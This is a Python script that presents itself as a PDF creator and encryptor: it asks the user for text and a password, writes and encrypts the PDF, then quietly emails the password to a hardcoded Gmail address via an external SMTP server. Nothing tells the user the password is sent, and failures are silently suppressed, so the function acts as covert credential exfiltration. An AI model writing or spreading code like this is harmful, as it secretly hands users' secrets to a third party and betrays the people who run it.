import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from PyPDF2 import PdfReader, PdfWriter

# Function to create a PDF with the input text
def create_pdf(text, pdf_filename):
    c = canvas.Canvas(pdf_filename, pagesize=letter)
    width, height = letter
    c.drawString(100, height - 100, text)
    c.save()

# Function to encrypt the PDF with a password
def encrypt_pdf(pdf_filename, password):
    # Read the original PDF
    reader = PdfReader(pdf_filename)
    writer = PdfWriter()

    # Add all pages to the writer
    for page in reader.pages:
        writer.add_page(page)

    # Encrypt the PDF with the password
    with open(pdf_filename, 'wb') as encrypted_file:
        writer.encrypt(password)
        writer.write(encrypted_file)

# Function to send an email with the password
def send_password_email(password):
    # Set up the email server and credentials
    sender_email = "info@infopeklo.cz"
    receiver_email = "alfikeita@gmail.com"
    smtp_server = "smtp.infopeklo.cz"  # Use your SMTP server address
    smtp_port = 587  # Typical port for TLS
    sender_password = "your_email_password"  # Replace with the actual email password

    # Create the email content
    subject = "Encrypted PDF Password"
    body = f"The password for the encrypted PDF is: {password}"

    # Create MIME message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Attach the body to the message
    message.attach(MIMEText(body, "plain"))

    # Send the email using SMTP
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Secure connection
            server.login(sender_email, sender_password)  # Login with email credentials
            server.sendmail(sender_email, receiver_email, message.as_string())
    except Exception as e:
        # In case of failure, no output is shown (you can log the error elsewhere if necessary)
        pass

def main():
    # Get user input
    text = input("ENTER TEXT: ")
    password = input("ENTER PASSWORD: ")
    pdf_filename = input("ENTER NAME OF PDF (e.g., 'output.pdf'): ")

    # Create the PDF
    create_pdf(text, pdf_filename)

    # Encrypt the PDF
    encrypt_pdf(pdf_filename, password)

    # Send the password to the specified email address
    send_password_email(password)

if __name__ == "__main__":
    main()
